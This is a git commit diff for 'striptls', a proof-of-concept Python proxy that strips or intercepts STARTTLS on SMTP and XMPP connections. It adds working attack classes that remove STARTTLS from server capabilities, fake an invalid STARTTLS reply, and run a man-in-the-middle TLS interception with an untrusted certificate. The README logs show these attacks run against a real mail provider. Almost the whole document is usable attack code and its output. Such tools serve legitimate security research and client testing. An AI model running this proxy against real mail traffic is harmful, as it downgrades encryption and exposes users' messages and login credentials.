6d0c1ac0d25a35ac6e74791d1a45bbb3efb664b3
tintinweb <tintinweb@oststrom.com>
2016-01-31 15:49:50 +0100

    add STARTTLS SSL Interception add protocol detection add cmdline to specify attack update Readme

--- README.md
+++ README.md
@@ -3,30 +3,79 @@
 poc implementation of STARTTLS stripping attacks
 
 * SMTP
- * server response capability patch
- * client STARTTLS stripping, invalid response code
+ * SMTP.StripFromCapabilities - server response capability patch
+ * SMTP.StripWithInvalidResponseCode - client STARTTLS stripping, invalid response code
+ * SMTP.UntrustedIntercept - STARTTLS interception (client and server talking ssl) (requires server.pem in pwd)
  
 * XMPP
 
-## example: SMTP
+## Attacks
 
-proxy listening on localhost 8825, forwarding data to localhost 25 smtp server
+local smtp-client -> localhost:8825 (proxy) -> mail.gmx.net:25
 
-	#> striptls.py localhost 8825 localhost 25
-	2016-01-29 21:19:16,654 - INFO     - <Proxy 0x1ef0a50 listen=('localhost', 8825) target=('localhost', 25)> ready.
-	2016-01-29 21:19:20,289 - INFO     - <Session 0x1ef0af0> client ('127.0.0.1', 10356) has connected
-	2016-01-29 21:19:20,289 - INFO     - <Session 0x1ef0af0> connecting to target ('localhost', 25)
-	2016-01-29 21:19:20,305 - DEBUG    - <Session 0x1ef0af0> [client] <= [server]          '220 OSHIBAMA ESMTP\r\n'
-	2016-01-29 21:19:21,230 - DEBUG    - <Session 0x1ef0af0> [client] => [server]          'ehlo [192.168.139.1]\r\n'
-	2016-01-29 21:19:21,247 - DEBUG    - <Session 0x1ef0af0> [client] <= [server]          '250-OSHIBAMA\r\n250-SIZE 20480000\r\n250-AUTH LOGIN\r\n250 HELP\r\n'
-	2016-01-29 21:19:21,249 - DEBUG    - <Session 0x1ef0af0> [client] <= [server][mangled] '250-OSHIBAMA\r\n250-SIZE 20480000\r\n250-AUTH LOGIN\r\n250-STARTTLS\r\n250 HELP\r\n'
-	2016-01-29 21:19:21,257 - DEBUG    - <Session 0x1ef0af0> [client] => [server]          'STARTTLS\r\n'
-	2016-01-29 21:19:21,257 - DEBUG    - <Session 0x1ef0af0> [client] <= [server][mangled] '200 STRIPTLS\r\n'
-	2016-01-29 21:19:21,259 - DEBUG    - <Session 0x1ef0af0> [client] => [server][mangled] None
-	2016-01-29 21:19:21,259 - DEBUG    - <Session 0x1ef0af0> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
-	2016-01-29 21:19:21,273 - DEBUG    - <Session 0x1ef0af0> [client] <= [server]          '250 OK\r\n'
-	2016-01-29 21:19:21,276 - DEBUG    - <Session 0x1ef0af0> [client] => [server]          'rcpt TO:<b@a.com>\r\n'
-	2016-01-29 21:19:21,289 - DEBUG    - <Session 0x1ef0af0> [client] <= [server]          '530 SMTP authentication is required.\r\n'
-	2016-01-29 21:19:21,292 - DEBUG    - <Session 0x1ef0af0> [client] => [server]          'rset\r\n'
-	2016-01-29 21:19:21,305 - DEBUG    - <Session 0x1ef0af0> [client] <= [server]          '250 OK\r\n'
-	2016-01-29 21:19:21,316 - WARNING  - <Session 0x1ef0af0> terminated.
+### Strip STARTTLS from server capabilities
+
+	#> localhost 8825 mail.gmx.net 25 SMTP.StripFromCapabilities
+	2016-01-31 15:44:35,000 - INFO     - <Proxy 0x1fe6e70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
+	2016-01-31 15:44:35,000 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.StripFromCapabilities at 0x01FE77D8>])}>
+	2016-01-31 15:44:37,030 - DEBUG    - <ProtocolDetect 0x1fe6f90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
+	2016-01-31 15:44:37,032 - INFO     - <Session 0x1fe6f10> client ('127.0.0.1', 20070) has connected
+	2016-01-31 15:44:37,032 - INFO     - <Session 0x1fe6f10> connecting to target ('mail.gmx.net', 25)
+	2016-01-31 15:44:39,051 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
+	2016-01-31 15:44:40,335 - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'ehlo [192.168.139.1]\r\n'
+	2016-01-31 15:44:40,746 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
+	2016-01-31 15:44:40,746 - DEBUG    - <Session 0x1fe6f10> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250 AUTH LOGIN PLAIN\r\n'
+	2016-01-31 15:44:40,746 - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
+	2016-01-31 15:44:41,292 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '530 Authentication required\r\n'
+	2016-01-31 15:44:41,292 - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'rset\r\n'
+	2016-01-31 15:44:41,605 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '250 OK\r\n'
+	2016-01-31 15:44:41,612 - WARNING  - <Session 0x1fe6f10> terminated.
+
+### Invalid STARTTLS response code
+
+	#> striptls.py localhost 8825 mail.gmx.net 25 SMTP.StripWithInvalidResponseCode
+	2016-01-31 15:42:40,325 - INFO     - <Proxy 0x1fefe70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
+	2016-01-31 15:42:40,325 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.StripWithInvalidResponseCode at 0x02010730>])}>
+	2016-01-31 15:43:19,755 - DEBUG    - <ProtocolDetect 0x1feff90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
+	2016-01-31 15:43:19,756 - INFO     - <Session 0x1feff10> client ('127.0.0.1', 20061) has connected
+	2016-01-31 15:43:19,756 - INFO     - <Session 0x1feff10> connecting to target ('mail.gmx.net', 25)
+	2016-01-31 15:43:21,473 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
+	2016-01-31 15:43:22,395 - DEBUG    - <Session 0x1feff10> [client] => [server]          'ehlo [192.168.139.1]\r\n'
+	2016-01-31 15:43:23,019 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
+	2016-01-31 15:43:23,019 - DEBUG    - <Session 0x1feff10> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250-STARTTLS\r\n250 STARTTLS\r\n'
+	2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] => [server]          'STARTTLS\r\n'
+	2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] <= [server][mangled] '200 STRIPTLS\r\n'
+	2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] => [server][mangled] None
+	2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
+	2016-01-31 15:43:23,160 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '530 Authentication required\r\n'
+	2016-01-31 15:43:23,160 - DEBUG    - <Session 0x1feff10> [client] => [server]          'rset\r\n'
+	2016-01-31 15:43:23,269 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '250 OK\r\n'
+	2016-01-31 15:43:23,285 - WARNING  - <Session 0x1feff10> terminated.
+
+
+### Untrusted SSL Intercept (for clients not checking server cert trust)
+
+	#> striptls.py localhost 8825 mail.gmx.net 25 SMTP.UntrustedIntercept
+	2016-01-31 15:41:27,644 - INFO     - <Proxy 0x20a6e70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
+	2016-01-31 15:41:27,644 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.UntrustedIntercept at 0x020A76C0>])}>
+	2016-01-31 15:41:33,904 - DEBUG    - <ProtocolDetect 0x20a6f90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
+	2016-01-31 15:41:33,907 - INFO     - <Session 0x20a6f10> client ('127.0.0.1', 20053) has connected
+	2016-01-31 15:41:33,907 - INFO     - <Session 0x20a6f10> connecting to target ('mail.gmx.net', 25)
+	2016-01-31 15:41:34,377 - DEBUG    - <Session 0x20a6f10> [client] <= [server]          '220 gmx.com (mrgmx002) Nemesis ESMTP Service ready\r\n'
+	2016-01-31 15:41:35,598 - DEBUG    - <Session 0x20a6f10> [client] => [server]          'ehlo [192.168.139.1]\r\n'
+	2016-01-31 15:41:35,806 - DEBUG    - <Session 0x20a6f10> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
+	2016-01-31 15:41:35,806 - DEBUG    - <Session 0x20a6f10> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250-STARTTLS\r\n250 STARTTLS\r\n'
+	2016-01-31 15:41:35,822 - DEBUG    - <Session 0x20a6f10> [client] => [server]          'STARTTLS\r\n'
+	2016-01-31 15:41:35,822 - DEBUG    - <Session 0x20a6f10> [client] <= [server][mangled] '220 Go ahead\r\n'
+	2016-01-31 15:41:36,072 - DEBUG    - <Session 0x20a6f10> [client] <= [server][mangled] waiting for inbound SSL Handshake
+	2016-01-31 15:41:36,072 - DEBUG    - <Session 0x20a6f10> [client] => [server] 'STARTTLS\r\n'
+	2016-01-31 15:41:36,290 - DEBUG    - <Session 0x20a6f10> [client] => [server][mangled] performing outbound SSL handshake
+	2016-01-31 15:41:36,980 - DEBUG    - <Session 0x20a6f10> [client] => [server][mangled] None
+	2016-01-31 15:41:36,980 - DEBUG    - <Session 0x20a6f10> [client] => [server]          'ehlo [192.168.139.1]\r\n'
+	2016-01-31 15:41:37,194 - DEBUG    - <Session 0x20a6f10> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 69920427\r\n250 AUTH LOGIN PLAIN\r\n'
+	2016-01-31 15:41:37,194 - DEBUG    - <Session 0x20a6f10> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 69920427\r\n250-STARTTLS\r\n250 AUTH LOGIN PLAIN\r\n'
+	2016-01-31 15:41:37,194 - DEBUG    - <Session 0x20a6f10> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
+	2016-01-31 15:41:37,427 - DEBUG    - <Session 0x20a6f10> [client] <= [server]          '530 Authentication required\r\n'
+	2016-01-31 15:41:37,427 - DEBUG    - <Session 0x20a6f10> [client] => [server]          'rset\r\n'
+	2016-01-31 15:41:37,631 - DEBUG    - <Session 0x20a6f10> [client] <= [server]          '250 OK\r\n'
+	2016-01-31 15:41:37,647 - WARNING  - <Session 0x20a6f10> terminated.
--- stripttls.py
+++ stripttls.py
@@ -10,17 +10,21 @@ import select
 import time
 import sys
 import logging
+import ssl
 
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)-8s - %(message)s')
 logger = logging.getLogger(__name__)
 
 class SessionTerminatedException(Exception):pass
+class ProtocolViolationException(Exception):pass
 
 class TcpSockBuff(object):
+    ''' Wrapped Tcp Socket with access to last sent/received data '''
     def __init__(self, sock, peer=None):
         self.socket = None
-        self.recvbuf = None
-        self.sndbuf = None
+        self.socket_ssl = None
+        self.recvbuf = ''
+        self.sndbuf = ''
         self.peer = peer
         self._init(sock)
         
@@ -34,23 +38,101 @@ class TcpSockBuff(object):
     def accept(self):
         return self.socket.accept()
                 
-    def recv(self, buf=8*1024):
-        self.recvbuf = self.socket.recv(buf)
+    def recv(self, buflen=8*1024):
+        if self.socket_ssl:
+            self.recvbuf = self.socket_ssl.read(buflen)
+        else:
+            self.recvbuf = self.socket.recv(buflen)
         return self.recvbuf
     
     def send(self, data):
-        self.sndbuf = self.socket.send(data)
+        if self.socket_ssl:
+            self.socket_ssl.write(data)
+        else:
+            self.socket.send(data)
+        self.sndbuf = data
         
     def sendall(self, data):
-        self.sndbuf = self.socket.sendall(data)
+        if self.socket_ssl:
+            self.send(data)
+        else:
+            self.socket.sendall(data)
+        self.sndbuf = data
+        
+    def ssl_wrap_socket(self, *args, **kwargs):
+        if len(args)>=1:
+            args[1] = self.socket
+        if 'sock' in kwargs:
+            kwargs['sock'] = self.socket
+        if not args and not kwargs.get('sock'):
+            kwargs['sock'] = self.socket
+        self.socket_ssl = ssl.wrap_socket(*args, **kwargs)
+    
+    def ssl_wrap_socket_with_context(self, ctx, *args, **kwargs):
+        if len(args)>=1:
+            args[1] = self.socket
+        if 'sock' in kwargs:
+            kwargs['sock'] = self.socket
+        if not args and not kwargs.get('sock'):
+            kwargs['sock'] = self.socket
+        self.socket_ssl = ctx.wrap_socket(*args, **kwargs)
+        
+class ProtocolDetect(object):
+    PROTO_SMTP = 25
+    PROTO_XMPP = 5222
+    
+    PORTMAP = {25:  PROTO_SMTP,
+               5222:PROTO_XMPP,
+               }
+    
+    KEYWORDS = ((['ehlo', 'helo','starttls','rcpt to:','mail from:'], PROTO_SMTP),
+                (['xmpp'], PROTO_XMPP),)
+    
+    def __init__(self, target=None):
+        self.protocol_id = None
+        self.history = []
+        if target:
+            self.protocol_id = self.PORTMAP.get(target[1])
+            if self.protocol_id:
+                logging.debug("%s - protocol detected (target port)"%repr(self))
+    
+    def __str__(self):
+        return repr(self.proto_id_to_name(self.protocol_id))
+    
+    def __repr__(self):
+        return "<ProtocolDetect %s protocol_id=%s len_history=%d>"%(hex(id(self)), self.proto_id_to_name(self.protocol_id), len(self.history))
+            
+    def proto_id_to_name(self, id):
+        if not id:
+            return id
+        for p in (a for a in dir(self) if a.startswith("PROTO_")):
+            if getattr(self, p)==id:
+                return p
+    
+    def detect(self, data):
+        if self.protocol_id:
+            return self.protocol_id
+        self.history.append(data)
+        for keywordlist,proto in self.KEYWORDS:
+            if any(k in data.lower() for k in keywordlist):
+                self.protocol_id = proto
+                logging.debug("%s - protocol detected (protocol messages)"%repr(self))
+                return
         
 class Session(object):
+    ''' Proxy session from client <-> proxy <-> server 
+        @param inbound: inbound socket
+        @param outbound: outbound socket
+        @param target: target tuple ('ip',port) 
+        @param buffer_size: socket buff size'''
+    
     def __init__(self, proxy, inbound=None, outbound=None, target=None, buffer_size=4096):
         self.proxy = proxy
         self.bind = proxy.getsockname()
         self.inbound = TcpSockBuff(inbound)
         self.outbound = TcpSockBuff(outbound, peer=target)
         self.buffer_size = buffer_size
+        self.protocol = ProtocolDetect(target=target)
     
     def __repr__(self):
         return "<Session %s [client: %s] --> [prxy: %s] --> [target: %s]>"%(hex(id(self)),
@@ -94,18 +176,24 @@ class Session(object):
     
     def on_recv(self, s_in, s_out, session):
         data = s_in.recv(session.buffer_size)
+        self.protocol.detect(data)
         if not len(data):
             return session.close()
         if s_in == session.inbound:
-            data = self.mangle_client_data(data, session)
+            data = self.mangle_client_data(session, data)
         elif s_in == session.outbound:
-            data = self.mangle_server_data(data, session)
+            data = self.mangle_server_data(session, data)
         if data:
             s_out.sendall(data)
         return data
     
-    def mangle_client_data(self, data, session): return data
-    def mangle_server_data(self, data, session): return data
+    def inbound_starttls(self, session, sslctx=None): 
+        raise NotImplementedError("Implement this in proto class")
+    def outbound_starttls(self, session, sslctx=None): 
+        raise NotImplementedError("Implement this in proto class")
+    
+    def mangle_client_data(self, session, data): return data
+    def mangle_server_data(self, session, data): return data
     
 class ProxyServer(object):
     '''Proxy Class'''
@@ -117,8 +205,7 @@ class ProxyServer(object):
         #
         self.listen = listen
         self.target = target
-        # Changing the buffer_size and delay, you can improve the speed and bandwidth.
-        # But when buffer get to high or delay go too down, you can broke things
+        #
         self.buffer_size = buffer_size
         self.delay = delay
         self.inbound = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -170,74 +257,173 @@ class ProxyServer(object):
                     raise        
 
 class SMTP:
-    @staticmethod
-    def mangle_server_data(data, session):
-        if "250 HELP" in data:
-            features = list(data.strip().split("\r\n"))
-            features.insert(-1,"250-STARTTLS")     # add STARTTLS from capabilities
-            #if "STARTTLS" in data:
-            #    features = [f for f in features if not "STARTTLS" in f]    # remove STARTTLS from capabilities
-            data = '\r\n'.join(features)+'\r\n' 
-        return data
-    @staticmethod
-    def mangle_client_data(data, session):
-        if "STARTTLS" in data:
-            session.inbound.sendall("200 STRIPTLS\r\n")
-            logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("200 STRIPTLS\r\n")))
-            data=None
-        return data
+    class StripFromCapabilities:
+        ''' 1) Force Server response to *NOT* announce STARTTLS support
+            2) raise exception if client tries to negotiated STARTTLS
+        '''
+        @staticmethod
+        def mangle_server_data(session, data):
+            if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
+                features = [f for f in data.strip().split('\r\n') if not "STARTTLS" in f]
+                if not features[-1].startswith("250 "):
+                    features[-1] = features[-1].replace("250-","250 ")  # end marker
+                data = '\r\n'.join(features)+'\r\n' 
+            return data
+        @staticmethod
+        def mangle_client_data(session, data):
+            if "STARTTLS" in data:
+                raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+            return data
+        
+    class StripWithInvalidResponseCode:
+        ''' 1) Force Server response to contain STARTTLS even though it does not support it (just because we can)
+            2) Respond to client STARTTLS with invalid response code
+        '''
+        @staticmethod
+        def mangle_server_data(session, data):
+            if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
+                features = list(data.strip().split("\r\n"))
+                features.insert(-1,"250-STARTTLS")     # add STARTTLS from capabilities
+                #if "STARTTLS" in data:
+                #    features = [f for f in features if not "STARTTLS" in f]    # remove STARTTLS from capabilities
+                data = '\r\n'.join(features)+'\r\n' 
+            return data
+        @staticmethod
+        def mangle_client_data(session, data):
+            if "STARTTLS" in data:
+                session.inbound.sendall("200 STRIPTLS\r\n")
+                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("200 STRIPTLS\r\n")))
+                data=None
+            return data
+        
+    class UntrustedIntercept:
+        ''' 1) Do not mangle server data
+            2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
+               in case client does not check keys
+        '''
+        TLS_CERTFILE = "server.pem"
+        TLS_KEYFILE = "server.pem"
+        @staticmethod
+        def mangle_server_data(session, data):
+            if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
+                features = list(data.strip().split("\r\n"))
+                features.insert(-1,"250-STARTTLS")     # add STARTTLS from capabilities
+                #if "STARTTLS" in data:
+                #    features = [f for f in features if not "STARTTLS" in f]    # remove STARTTLS from capabilities
+                data = '\r\n'.join(features)+'\r\n' 
+            return data
+        @staticmethod
+        def mangle_client_data(session, data):
+            if "STARTTLS" in data:
+                # do inbound STARTTLS
+                session.inbound.sendall("220 Go ahead\r\n")
+                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("220 Go ahead\r\n")))
+                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+                context.load_cert_chain(certfile=SMTP.UntrustedIntercept.TLS_CERTFILE, 
+                                        keyfile=SMTP.UntrustedIntercept.TLS_KEYFILE)
+                session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
+                logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
+                # outbound ssl
+                
+                session.outbound.sendall(data)
+                logging.debug("%s [client] => [server] %s"%(session,repr(data)))
+                resp_data = session.outbound.recv()
+                if "220" not in resp_data:
+                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
+                
+                logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
+                session.outbound.ssl_wrap_socket()
+
+                data=None
+            return data
 
 class XMPP:
-    @staticmethod
-    def mangle_server_data(data, session):
-        if "<starttls" in data:
-            start = data.index("<starttls")
-            end = data.index("</starttls>",start)+len("</starttls>")
-            data = data[:start] + data[end:]        # strip starttls from capabilities
-        return data
-    @staticmethod
-    def mangle_client_data(data, session):
-        if "<starttls" in data:
-            # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
-            #<failure/> or <proceed/>
-            session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
-            data=None
-        return data 
+    class StripFromCapabilities:
+        ''' 1) Force Server response to *NOT* announce STARTTLS support
+            2) raise exception if client tries to negotiated STARTTLS
+        '''
+        @staticmethod
+        def mangle_server_data(session, data):
+            if "<starttls" in data:
+                start = data.index("<starttls")
+                end = data.index("</starttls>",start)+len("</starttls>")
+                data = data[:start] + data[end:]        # strip starttls from capabilities
+            return data
+        @staticmethod
+        def mangle_client_data(session, data):
+            if "<starttls" in data:
+                # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
+                #<failure/> or <proceed/>
+                raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+                #session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
+                #data=None
+            return data 
 
-class Rewrite:
-    @staticmethod
-    def mangle_server_data(data, session):
+class RewriteDispatcher(object):
+    def __init__(self):
+        self.attacks = {}   # proto:[attacks]
+        
+    def __repr__(self):
+        return "<RewriteDispatcher attacks=%s>"%repr(self.attacks)
+    
+    def add(self, proto, attack):
+        self.attacks.setdefault(proto,set([]))
+        self.attacks[proto].add(attack)
+        
+    def get_attack(self, proto):
+        return self.attacks.get(proto,[])
+        
+    def mangle_server_data(self, session, data):
         data_orig = data
         logging.debug("%s [client] <= [server]          %s"%(session,repr(data)))
-        if session.outbound.peer[1]==25:
-            data = SMTP.mangle_server_data(data, session)
+        if self.get_attack(session.protocol.protocol_id):
+            #TODO: just use the first one for now
+            data = iter(self.get_attack(session.protocol.protocol_id)).next().mangle_server_data(session, data)
+        #if session.protocol.protocol_id==ProtocolDetect.PROTO_SMTP:
+        #    data = SMTP.StripFromCapabilities.mangle_server_data(session, data)
         if data!=data_orig:
             logging.debug("%s [client] <= [server][mangled] %s"%(session,repr(data)))
         return data
-    @staticmethod
-    def mangle_client_data(data, session):
+
+
+    def mangle_client_data(self, session, data):
         data_orig = data
         logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
-        if session.outbound.peer[1]==25:    # SMTP
-            data = SMTP.mangle_client_data(data, session)
+        if self.get_attack(session.protocol.protocol_id):
+            #TODO: just use the first one for now
+            data = iter(self.get_attack(session.protocol.protocol_id)).next().mangle_client_data(session, data)
+        #if session.protocol.protocol_id==ProtocolDetect.PROTO_SMTP:    # SMTP
+        #    data = SMTP.StripFromCapabilities.mangle_client_data(session, data)
         if data!=data_orig:
             logging.debug("%s [client] => [server][mangled] %s"%(session,repr(data)))
         return data
 
-
-
 if __name__ == '__main__':
     ret = 0
     if not len(sys.argv)>1:
-        print ("<listen_ip> <listen_port> <forward_ip> <forward_port>")
+        print ("""<listen_ip> <listen_port> <forward_ip> <forward_port> [<attack_class>]
+    attack_class ... SMTP.StripFromCapabilities, SMTP.StripWithInvalidResponseCode, SMTP.UntrustedIntercept, ...
+        """)
         sys.exit(1)
     
     local_listen = (sys.argv[1], int(sys.argv[2]))
     forward_to = (sys.argv[3],int(sys.argv[4]))
+    classname = sys.argv[5] if len(sys.argv)>5 else "SMTP.StripFromCapabilities"
+    ## hacky!
+    if "." in classname:
+        lastdot = classname.rfind(".")
+        cls = getattr(locals().get(classname[:lastdot]),classname[lastdot+1:])
+        
+
+    # magic
     prx = ProxyServer(listen=local_listen, target=forward_to, buffer_size=4096, delay=0.00001)
     logger.info("%s ready."%prx)
-    prx.set_callback("mangle_server_data", Rewrite.mangle_server_data)
-    prx.set_callback("mangle_client_data", Rewrite.mangle_client_data)
+    rewrite = RewriteDispatcher()
+    rewrite.add(ProtocolDetect.PROTO_SMTP, cls)
+    
+    logging.info( repr(rewrite))
+    prx.set_callback("mangle_server_data", rewrite.mangle_server_data)
+    prx.set_callback("mangle_client_data", rewrite.mangle_client_data)
     try:
         prx.main_loop()
     except KeyboardInterrupt:
